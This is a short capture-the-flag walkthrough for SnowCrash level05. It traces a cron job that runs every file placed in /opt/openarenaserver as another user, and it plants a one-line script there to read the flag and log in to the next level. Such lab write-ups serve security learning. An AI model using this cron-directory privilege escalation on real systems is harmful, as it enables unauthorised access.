# level05

After enumerating regular possibilty, we can find new interesting line inside `env`.

```bash
level05@SnowCrash:~$ env
MAIL=/var/mail/level05
```

Let's check if we can find our token.

```bash
level05@SnowCrash:~$ cat $MAIL
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

No, so, let's check the executed program.

```bash
level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
    (ulimit -t 5; bash -x "$i")
    rm -f "$i"
done
```

Ok, we can see that the script `openarenaserver` execute each file in /opt/openarenaserver directory and then delete them.

Let's create a payload here and wait the command to be executed.

```bash
level05@SnowCrash:~$ echo "getflag > /tmp/flag" > /opt/openarenaserver/flag.sh
```

After two minutes, we can see our flag.

```bash
level05@SnowCrash:~$ cat /tmp/flag
Check flag.Here is your token : viuaaale9huek52boumoomioc
```

Let's head to level06.

```bash
level05@SnowCrash:~$ su level06
Password: viuaaale9huek52boumoomioc
```
